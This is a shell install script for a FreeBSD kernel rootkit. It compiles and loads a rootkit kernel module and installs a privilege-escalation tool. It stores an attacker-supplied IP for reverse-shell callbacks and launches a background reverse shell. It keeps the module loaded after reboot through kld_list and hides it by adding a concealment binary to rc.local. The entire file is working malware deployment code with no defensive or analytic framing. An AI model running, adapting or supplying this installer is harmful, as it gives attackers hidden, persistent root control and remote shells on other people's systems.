#!/bin/sh

set -eu

REMOTE_IP="${1:-}"

PROJECT_DIR=$(CDPATH= cd -P "$(dirname "$0")" && pwd)

MODULE_DIR="$PROJECT_DIR/kernel"
USERSPACE_DIR="$PROJECT_DIR/user"
PERSISTENCE_DIR="/boot/modules"

MODULE_FILE="$MODULE_DIR/rootkit.ko"
PERSISTENCE_FILE="$PERSISTENCE_DIR/rootkit.ko"

ELEVATE_SRC="$USERSPACE_DIR/elevate.c"
ELEVATE_BIN="$USERSPACE_DIR/elevate"
REMOTE_SRC="$PROJECT_DIR/remote.c"
REMOTE_BIN="$PROJECT_DIR/remote"

fail() {
    printf 'Installation Error: %s\n' "$*" >&2
    exit 1
}

# Checks for root privileges, FreeBSD OS, and required commands
[ -d "$MODULE_DIR" ] || fail "Kernel directory not found: $MODULE_DIR"
[ -f "$ELEVATE_SRC" ] || fail "Source file not found: $ELEVATE_SRC"

# Store REMOTE IP for reverse shell callbacks
echo "$REMOTE_IP" > /etc/rootkit_remote_ip

# Check dependencies
for command in make kldload kldstat cc install sysrc realpath; do
    command -v "$command" >/dev/null 2>&1
done

# Build rootkit.ko
make -C "$MODULE_DIR"
[ -f "$MODULE_FILE" ]

# Build elevate
cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC"

# Build revshell inside $MODULE_DIR
# printf '%s\n' '[*] Building revshell...'
cc -Wall -Wextra -I. -I"$MODULE_DIR" -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" || fail "Failed to build revshell"
chmod 755 "$MODULE_DIR/revshell"

# printf '%s\n' '[*] Building remote client binary...'
cc -O2 -Wall -o "$REMOTE_BIN" "$REMOTE_SRC"
chmod 755 "$REMOTE_BIN"

# Ensures persistence 
MODULE_LOADED=false
if kldstat -q -m rootkit >/dev/null 2>&1 || [ -c /dev/rootkit ]; then
    MODULE_LOADED=true
fi

install -d -m 755 "$PERSISTENCE_DIR"
install -m 555 "$MODULE_FILE" "$PERSISTENCE_FILE"


# Add rootkit to kld_list without duplicating existing entries
sysrc kld_list+=rootkit >/dev/null


# Load it during the current boot
if [ "$MODULE_LOADED" = false ]; then
    kldload "$PERSISTENCE_FILE"

    if ! kldstat -q -m rootkit >/dev/null 2>&1 && [ ! -c /dev/rootkit ]; then
        exit 1
    fi
fi

# Verify elevate was built successfully
[ -f "$ELEVATE_BIN" ]
[ -x "$ELEVATE_BIN" ]

# Install binaries to /usr/local/bin
printf '%s\n' '[*] Installing binaries to /usr/local/bin...'
install -d -m 755 /usr/local/bin 
install -m 755 "$ELEVATE_BIN" /usr/local/bin/elevate 
install -m 755 "$MODULE_DIR/revshell" /usr/local/bin/revshell 

# Launch revshell background worker using the installed binary path
pkill -f revshell 2>/dev/null || true
nohup /usr/local/bin/revshell >/dev/null 2>&1 &

# Install hiding
cc -Wall -Wextra -o "$PROJECT_DIR/user/hide_kld" "$PROJECT_DIR/user/hide_kld.c"

ABS_PATH=$(realpath "$PROJECT_DIR/user/hide_kld")

if [ ! -f /etc/rc.local ]; then
    echo "#!/bin/sh" > /etc/rc.local
fi
chmod +x /etc/rc.local


# Ensures no duplicate entries in rc.local
if ! grep -q "hide_kld" /etc/rc.local; then
    echo "$ABS_PATH &" >> /etc/rc.local
fi

"$ABS_PATH" &
